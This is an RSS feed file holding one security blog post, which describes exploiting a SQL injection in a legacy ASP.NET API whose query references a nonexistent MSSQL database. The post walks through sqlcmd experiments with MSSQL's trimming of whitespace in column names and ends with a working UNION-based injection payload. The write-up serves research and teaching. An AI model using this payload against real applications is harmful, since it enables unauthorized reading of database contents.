@@ -1,0 +1,229 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>cyku.tw – English</title><link>https://cyku.tw/tags/english/</link><description>Recent content in English on cyku.tw</description><generator>Hugo -- gohugo.io</generator><language>zh-TW</language><lastBuildDate>Sun, 04 Aug 2024 16:05:05 +0800</lastBuildDate><atom:link href="https://cyku.tw/tags/english/index.xml" rel="self" type="application/rss+xml"/><item><title>No Database No Table, how do you do MSSQL Injection?</title><link>https://cyku.tw/blog/no-database-mssql-injection/</link><pubDate>Sun, 04 Aug 2024 16:05:05 +0800</pubDate><guid>https://cyku.tw/blog/no-database-mssql-injection/</guid><description>
+&lt;p&gt;One day, while reviewing the code of an ASP.NET website, I came across a special case of SQL Injection with Microsoft SQL Server, basically the form of SQL Injection is like this:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;string&lt;/span&gt; sql = &lt;span style="color:#66d9ef"&gt;string&lt;/span&gt;.Format(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;SELECT ReportsDB..{0}.* &amp;#34;&lt;/span&gt; +
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;FROM ReportsDB..{0} &amp;#34;&lt;/span&gt; +
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;WHERE ReportsDB..{0}.Id = 1 &amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;, Request[&lt;span style="color:#e6db74"&gt;&amp;#34;table&amp;#34;&lt;/span&gt;]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// ReportsDB doesn&amp;#39;t exist&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The first time I saw it, I thought it was just a simple SQL Injection that I could exploit as usual, I could be wrong. This code was found in a legacy API, there&amp;rsquo;s actually no database called &amp;ldquo;ReportsDB&amp;rdquo; in that MSSQL server. If we try to inject stacked query, MSSQL will just respond error and won&amp;rsquo;t execute the second query, because &amp;ldquo;ReportsDB&amp;rdquo; dosen&amp;rsquo;t exist.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;1&amp;gt; select ReportsDB..foobar; waitfor delay &amp;#39;00:00:03&amp;#39;; -- .*
+2&amp;gt; go
+Msg 4104, Level 16, State 1, Server 38edaa74cb29, Line 1
+The multi-part identifier &amp;#34;ReportsDB..foobar&amp;#34; could not be bound.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Then I tried to use subquery to create a table called &amp;ldquo;ReportsDB&amp;rdquo; but got error again.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;1&amp;gt; select ReportsDB..foobar from (select 1 as foobar) as ReportsDB;
+2&amp;gt; go
+Msg 207, Level 16, State 1, Server 38edaa74cb29, Line 1
+Invalid column name &amp;#39;&amp;#39;.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&amp;ldquo;Invalid column name&amp;rdquo; is an interesting result, it means that MSSQL considers &amp;ldquo;ReportsDB..foobar&amp;rdquo; to be &lt;code&gt;&amp;lt;table_name&amp;gt;.&amp;lt;column_name&amp;gt;.&amp;lt;something&amp;gt;&lt;/code&gt; instead of &lt;code&gt;&amp;lt;database_name&amp;gt;.&amp;lt;schema_name&amp;gt;.&amp;lt;column_name&amp;gt;&lt;/code&gt;. The database_name is ReportsDB and column_name is an empty string now, the next question which I was thinking is that &amp;ldquo;Can I define a column_name with empty string using AS statement?&amp;rdquo;. The answer is NO.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;1&amp;gt; select ReportsDB..foobar from (select 1 as &amp;#39;&amp;#39;) as ReportsDB;
+2&amp;gt; go
+Msg 1038, Level 15, State 4, Server 38edaa74cb29, Line 1
+An object or column name is missing or empty. For SELECT INTO statements, verify each column has a name. For other statements, look for empty alias names. Aliases defined as &amp;#34;&amp;#34; or [] are not allowed. Change the alias to a valid name.
+1&amp;gt; select ReportsDB..foobar from (select 1 as []) as ReportsDB;
+2&amp;gt; go
+Msg 1038, Level 15, State 4, Server 38edaa74cb29, Line 1
+An object or column name is missing or empty. For SELECT INTO statements, verify each column has a name. For other statements, look for empty alias names. Aliases defined as &amp;#34;&amp;#34; or [] are not allowed. Change the alias to a valid name.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;I also tried to create a column called &amp;ldquo;.foobar&amp;rdquo;, which is a valid column name, but MSSQL never considers that the second dot of &amp;ldquo;ReportsDB..foobar&amp;rdquo; is the part of the column name.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;1&amp;gt; select ReportsDB..foobar from (select 1 as [.foobar]) as ReportsDB;
+2&amp;gt; go
+Msg 207, Level 16, State 1, Server 38edaa74cb29, Line 1
+Invalid column name &amp;#39;&amp;#39;.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;It seems to end, but it can&amp;rsquo;t be, can it?&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Space Trimming to the Rescue&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;In MSSQL, trailing whitespace is valid when defining column names, and it does work if the statement of SELECT uses a column name that contains trailing whitespace.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;1&amp;gt; select [ReportsDB].[a ] from (select 1 as [a ]) as ReportsDB;
+2&amp;gt; go
+a
+-----------
+1
+(1 rows affected)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;But what if without whitespace in the first SELECT? It still works ..&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;1&amp;gt; select [ReportsDB].[a] from (select 1 as [a ]) as ReportsDB;
+2&amp;gt; go
+a
+-----------
+1
+(1 rows affected)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Even more whitespaces.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;1&amp;gt; select [ReportsDB].[a ] from (select 1 as [a ]) as ReportsDB;
+2&amp;gt; go
+a
+-----------
+1
+(1 rows affected)
+1&amp;gt; select [ReportsDB].[a ] from (select 1 as [a]) as ReportsDB;
+2&amp;gt; go
+a
+-----------
+1
+(1 rows affected)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Apparently, MSSQL does some kind of trimming for whitespace when processing column names. So what if you just use a single whitespace as the column name? The answer is &amp;ldquo;It still works&amp;rdquo;.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;1&amp;gt; select [ReportsDB].[ ] from (select 1 as [ ]) as ReportsDB;
+2&amp;gt; go
+-----------
+1
+(1 rows affected)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;MSSQL obviously does not allow you to use empty string in the &lt;code&gt;[]&lt;/code&gt; expression in the SELECT statement. But wait a minute, do you remember what the SQL for the injection point looked like?&lt;/p&gt;
+&lt;p&gt;Well..&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;1&amp;gt; select ReportsDB..foobar from (select 1 as [ ]) as ReportsDB;
+2&amp;gt; go
+Msg 258, Level 15, State 1, Server 38edaa74cb29, Line 1
+Cannot call methods on int.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;IT WORKS..&lt;/p&gt;
+&lt;p&gt;MSSQL accepts empty string as column name with &lt;code&gt;..&lt;/code&gt; syntax. What&amp;rsquo;s happening is that MSSQL considers &lt;code&gt;ReportsDB.&lt;/code&gt; (empty string as column name) to be a valid field, &lt;code&gt;1&lt;/code&gt; to be the value of this field, and &lt;code&gt;int&lt;/code&gt; to be the date type of the field. It tried to look for a property named &lt;code&gt;foobar&lt;/code&gt; under int data type but coudn&amp;rsquo;t find it. The column name in the first SELECT is defined as an empty string, the column name in the subquery is defined as a whitespace, and MSSQL does some kind of whitespace trimming to assume that the two column names are the same, so it ends up working.&lt;/p&gt;
+&lt;p&gt;How do we define the property of a data type in SELECT?&lt;/p&gt;
+&lt;p&gt;In fact, we don&amp;rsquo;t need to do this at all, why not just use existing objects in MSSQL? So I randomly chose a data type called &lt;code&gt;geometry&lt;/code&gt; which has a lots of properies such as &lt;code&gt;STY&lt;/code&gt;. In short, I constructed a SQL like the one below, and it worked perfectly!&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;1&amp;gt; select ReportsDB..STY from (select geometry::STGeomFromText(&amp;#39;POINT(0 0)&amp;#39;,0) as [ ]) as ReportsDB;
+2&amp;gt; go
+------------------------
+0.0
+(1 rows affected)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Finally, I managed to exploit this SQL Injection with a payload similar to the one below. What&amp;rsquo;s even better is that it&amp;rsquo;s UNION based.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;?table=STY as id, @@version as data from (select geometry::STGeomFromText(&amp;#39;POINT(0 0)&amp;#39;,0) as [ ]) as ReportsDB -- &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;That&amp;rsquo;s the short story I came across. MSSQL&amp;rsquo;s T-SQL is very powerful, and there are probably more simple ways to exploit it, so it&amp;rsquo;s always worth a try.&lt;/p&gt;</description></item></channel></rss>
